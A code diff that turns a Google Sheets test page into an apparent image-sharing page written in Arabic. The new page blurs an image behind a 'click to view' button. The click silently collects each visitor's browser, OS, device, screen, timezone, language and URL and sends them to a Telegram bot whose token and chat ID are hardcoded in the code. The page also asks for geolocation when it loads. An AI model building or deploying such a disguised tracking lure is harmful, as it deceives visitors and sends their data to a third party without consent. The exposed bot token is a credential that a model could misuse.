@@ -3,248 +3,225 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختبار الإرسال</title>
+    <title>موقع رفع الصور</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #f5f5f5;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .test-box {
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
             background: white;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
+            overflow: hidden;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: white;
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
             text-align: center;
         }
-        button {
-            background: #4CAF50;
+
+        .main-image {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 15px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+            margin: 30px auto;
+            filter: blur(20px);
+            transition: filter 0.5s ease;
+            display: block;
+        }
+
+        .main-image.clear {
+            filter: blur(0px);
+        }
+
+        .click-button {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
             color: white;
-            padding: 15px 30px;
             border: none;
-            border-radius: 5px;
-            font-size: 16px;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.2em;
+            font-weight: bold;
             cursor: pointer;
-            margin: 10px;
+            margin: 20px auto;
+            display: block;
+            transition: all 0.3s ease;
         }
-        button:hover {
-            background: #45a049;
+
+        .click-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
         }
-        .status {
-            margin: 20px 0;
-            padding: 15px;
-            border-radius: 5px;
-            display: none;
-        }
-        .success {
+
+        .success-message {
             background: #d4edda;
             color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .log {
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
-            text-align: left;
-            font-family: monospace;
-            white-space: pre-wrap;
-            max-height: 300px;
-            overflow-y: auto;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px;
+            text-align: center;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="test-box">
-        <h1>🔧 اختبار الاتصال المباشر</h1>
-        <p>هذه الصفحة لاختبار الإرسال إلى Google Sheets</p>
-        
-        <div>
-            <label for="scriptUrl">رابط Google Apps Script:</label><br>
-            <input type="text" id="scriptUrl" style="width: 100%; padding: 10px; margin: 10px 0;" 
-                   value="https://script.google.com/macros/s/AKfycbwBSogUHqNidaTg7WUe2jhXSVarbQW-1VOqcr1n16rjVjns6MRccow0MwupxsWOmKw/exec">
+    <div class="container">
+        <div class="header">
+            <h1>موقع رفع الصور</h1>
+            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
         </div>
-        
-        <button onclick="testConnection()">🚀 اختبار الاتصال</button>
-        <button onclick="sendRealData()">📤 إرسال بيانات حقيقية</button>
-        <button onclick="clearLog()">🗑️ مسح السجل</button>
-        
-        <div id="status" class="status"></div>
-        <div id="log" class="log"></div>
+
+        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
+             alt="الصورة المختارة" 
+             class="main-image" 
+             id="mainImage">
+
+        <button class="click-button" id="viewButton" onclick="viewImage()">
+            🔍 اضغط هنا لمشاهدة الصورة
+        </button>
+
+        <div class="success-message" id="successMessage">
+            ✅ تم الموافقة على عرض الصورة
+        </div>
     </div>
 
     <script>
-        let logContent = '';
-
-        function log(message) {
-            const timestamp = new Date().toLocaleTimeString('ar-IQ');
-            logContent += `[${timestamp}] ${message}\n`;
-            document.getElementById('log').textContent = logContent;
-            console.log(message);
-        }
-
-        function showStatus(message, isError = false) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = isError ? 'status error' : 'status success';
-            statusDiv.style.display = 'block';
-        }
-
-        function clearLog() {
-            logContent = '';
-            document.getElementById('log').textContent = '';
-            document.getElementById('status').style.display = 'none';
-        }
-
-        async function testConnection() {
-            const scriptUrl = document.getElementById('scriptUrl').value.trim();
+        function collectData() {
+            const ua = navigator.userAgent;
             
-            if (!scriptUrl) {
-                showStatus('الرجاء إدخال رابط Google Apps Script', true);
-                return;
-            }
-
-            log('🔍 بدء اختبار الاتصال...');
-            log('🔗 الرابط: ' + scriptUrl);
-
-            try {
-                // اختبار GET أولاً
-                log('📡 اختبار GET request...');
-                const getResponse = await fetch(scriptUrl, { method: 'GET' });
-                const getResult = await getResponse.text();
-                log('✅ GET response: ' + getResult);
-
-                // اختبار POST
-                log('📤 اختبار POST request...');
-                const testData = {
-                    test: true,
-                    timestamp: new Date().toLocaleString('ar-IQ'),
-                    page_url: 'صفحة الاختبار المباشر',
-                    user_agent: navigator.userAgent,
-                    test_id: 'DIRECT_TEST_' + Date.now()
-                };
-
-                log('📦 البيانات المرسلة: ' + JSON.stringify(testData, null, 2));
-
-                const formData = 'data=' + encodeURIComponent(JSON.stringify(testData));
-                log('📝 Form data length: ' + formData.length + ' characters');
-
-                const postResponse = await fetch(scriptUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: formData
-                });
-
-                log('📬 POST status: ' + postResponse.status);
-                
-                try {
-                    const postResult = await postResponse.text();
-                    log('✅ POST response: ' + postResult);
-                } catch (e) {
-                    log('⚠️ Could not read POST response (this is normal with no-cors)');
-                }
-
-                showStatus('✅ تم الاختبار بنجاح! تحقق من Google Sheet');
-
-            } catch (error) {
-                log('❌ خطأ في الاختبار: ' + error.message);
-                showStatus('❌ فشل الاختبار: ' + error.message, true);
-            }
-        }
-
-        async function sendRealData() {
-            const scriptUrl = document.getElementById('scriptUrl').value.trim();
+            let deviceType = 'كمبيوتر';
+            if (/Mobile|Android|iPhone|iPad/.test(ua)) deviceType = 'جهاز محمول';
+            else if (/Tablet|iPad/.test(ua)) deviceType = 'تابلت';
             
-            if (!scriptUrl) {
-                showStatus('الرجاء إدخال رابط Google Apps Script', true);
-                return;
-            }
-
-            log('🚀 إرسال بيانات حقيقية...');
-
-            // جمع معلومات حقيقية
-            const data = {
+            let browser = 'غير معروف';
+            if (ua.includes('Chrome')) browser = 'كروم';
+            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
+            else if (ua.includes('Safari')) browser = 'سفاري';
+            else if (ua.includes('Edge')) browser = 'إيدج';
+            
+            let os = 'غير معروف';
+            if (ua.includes('Windows')) os = 'ويندوز';
+            else if (ua.includes('Mac')) os = 'ماك';
+            else if (ua.includes('Linux')) os = 'لينكس';
+            else if (ua.includes('Android')) os = 'أندرويد';
+            else if (ua.includes('iOS')) os = 'iOS';
+            
+            return {
                 timestamp: new Date().toLocaleString('ar-IQ'),
                 page_url: window.location.href,
-                referrer: document.referrer || 'مباشر',
-                device_type: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر',
-                browser: getBrowser(),
-                operating_system: getOS(),
-                screen_resolution: screen.width + 'x' + screen.height,
+                device_type: deviceType,
+                browser: browser,
+                operating_system: os,
+                screen_resolution: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
-                user_agent: navigator.userAgent,
-                test_id: 'REAL_DATA_' + Date.now()
+                user_agent: ua
             };
+        }
 
-            log('📊 البيانات الحقيقية: ' + JSON.stringify(data, null, 2));
+        function sendToTelegram(data) {
+            // التوكن الخاص بالبوت
+            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
+            // Chat ID الخاص بك
+            const TELEGRAM_CHAT_ID = '170383339';
+            
+            const message = `
+🆕 زائر جديد للموقع:
+━━━━━━━━━━━━━━━━━━
+⏰ الوقت: ${data.timestamp}
+🌐 الرابط: ${data.page_url}
+📱 الجهاز: ${data.device_type}
+💻 المتصفح: ${data.browser}
+🖥️ النظام: ${data.operating_system}
+📺 الدقة: ${data.screen_resolution}
+🌍 المنطقة: ${data.timezone}
+🗣️ اللغة: ${data.language}
+━━━━━━━━━━━━━━━━━━
+            `;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
+                    return response.json();
+                } else {
+                    console.error('❌ فشل إرسال البيانات إلى Telegram');
+                    throw new Error('Telegram API Error');
+                }
+            }).then(data => {
+                console.log('📱 استجابة Telegram:', data);
+            }).catch(error => {
+                console.error('❌ خطأ في الإرسال:', error);
+            });
+        }
 
-            try {
-                const formData = 'data=' + encodeURIComponent(JSON.stringify(data));
+        function viewImage() {
+            // إظهار الصورة
+            document.getElementById('mainImage').classList.add('clear');
+            document.getElementById('viewButton').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+            
+            // جمع وإرسال البيانات
+            const data = collectData();
+            console.log('بيانات الزائر:', data);
+            
+            // إرسال البيانات (اختر إحدى الطرق)
+            sendToTelegram(data);
+            
+            // أو إرسال على إيميلك مباشرة
+            const emailBody = Object.entries(data)
+                .map(([key, value]) => `${key}: ${value}`)
+                .join('\n');
                 
-                const response = await fetch(scriptUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: formData
-                });
-
-                log('✅ تم إرسال البيانات الحقيقية');
-                showStatus('✅ تم إرسال البيانات الحقيقية! تحقق من Google Sheet');
-
-                // محاولة إضافية بـ GET
-                setTimeout(async () => {
-                    try {
-                        const getUrl = scriptUrl + '?data=' + encodeURIComponent(JSON.stringify(data));
-                        await fetch(getUrl, { method: 'GET' });
-                        log('✅ تم إرسال نسخة احتياطية بـ GET');
-                    } catch (e) {
-                        log('⚠️ فشلت النسخة الاحتياطية: ' + e.message);
-                    }
-                }, 1000);
-
-            } catch (error) {
-                log('❌ خطأ في إرسال البيانات: ' + error.message);
-                showStatus('❌ فشل الإرسال: ' + error.message, true);
-            }
+            const mailtoLink = `mailto:your-email@gmail.com?subject=زائر جديد للموقع&body=${encodeURIComponent(emailBody)}`;
+            
+            // فتح الإيميل (اختياري)
+            // window.open(mailtoLink);
         }
 
-        function getBrowser() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Chrome')) return 'كروم';
-            if (ua.includes('Firefox')) return 'فايرفوكس';
-            if (ua.includes('Safari')) return 'سفاري';
-            if (ua.includes('Edge')) return 'إيدج';
-            return 'غير معروف';
-        }
-
-        function getOS() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Windows')) return 'ويندوز';
-            if (ua.includes('Mac')) return 'ماك';
-            if (ua.includes('Linux')) return 'لينكس';
-            if (ua.includes('Android')) return 'أندرويد';
-            if (ua.includes('iOS')) return 'iOS';
-            return 'غير معروف';
-        }
-
-        // تشغيل اختبار تلقائي عند تحميل الصفحة
+        // الحصول على الموقع الجغرافي عند التحميل
         window.addEventListener('load', function() {
-            log('🏁 تم تحميل صفحة الاختبار');
-            log('🌐 الرابط الحالي: ' + window.location.href);
-            log('📱 نوع الجهاز: ' + (/Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر'));
-            log('🔧 جاهز للاختبار!');
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    console.log('الموقع:', position.coords.latitude, position.coords.longitude);
+                });
+            }
         });
     </script>
 </body>
